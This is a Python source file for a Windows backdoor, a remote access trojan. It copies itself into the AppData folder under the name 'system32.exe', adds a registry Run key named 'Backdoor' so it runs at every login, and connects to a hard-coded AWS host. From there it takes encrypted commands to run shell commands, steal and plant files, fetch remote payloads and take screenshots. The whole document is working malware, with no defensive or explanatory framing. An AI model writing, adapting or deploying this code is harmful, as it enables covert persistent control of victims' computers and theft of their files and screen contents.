#!/usr/bin/python 

import socket 
import subprocess
import json
import os
import base64
import shutil
from shutil import copyfile
import sys
import requests
from mss import mss
from Crypto.Cipher import AES

def do_encrypt(message):
    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
    ciphertext = obj.encrypt(message)
    return ciphertext

def do_decrypt(ciphertext):
    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
    message = obj2.decrypt(ciphertext)
    return message

def my_send(data):
	ciphertext1 = do_encrypt(data)
        json_data = json.dumps(ciphertext1)
        sock.send(json_data)
def my_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
			text = do_decrypt(data)
                        return json.loads(text)
                except ValueError:
                        continue
def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def download(url):
	get_url = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_url.content)
def shell():
        while True:
                command = my_recv()
                if command == 'q':
                        break
                elif command[:2] == "cd" and len(command) > 1:
                     try:
                        os.chdir(command[3:])
                     except:
                             continue
                elif command[:8] == "download":
                        with open(command[9:], "rb") as file:
                                my_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as file2:
                                file_data = my_recv()
                                file2.write(base64.b64decode(file_data))
		elif command[:3] == "get":
			try:
				download(command[4:])
				my_send("[+] Download file from url started")
			except:
				my_send("[+] Failed to download")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png", "rb") as file_shot :
					my_send(base64.b64encode, file_shot.read())
				os.remnove("monitor-1.png")
			except:
				my_send("[!!] Failed to take screenshot")
		elif command[:5] == "start":
			try: 
				subprocess.Popen(command[6:], shell=True)
				my_send("[+] Started!")
			except:
				my_send("[!!] Failed to start") 
                else:
                       proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                       result = proc.stdout.read() + proc.stderr.read()
                       my_send(result)

location  = os.environ["appdata"] + "\\system32.exe"
if not os.path.exists(location):
  shutil.copyfile(sys.executable,location)
  subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell=True)
#HOST = 'ec2-100-20-118-82.us-west-2.compute.amazonaws.com'
HOST = 'agentLB-e9d579b2e376ded2.elb.us-west-2.amazonaws.com'
PORT = 54436
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.connect(('100.20.118.82', 54436))
sock.connect((HOST, PORT))
shell()

sock.close()


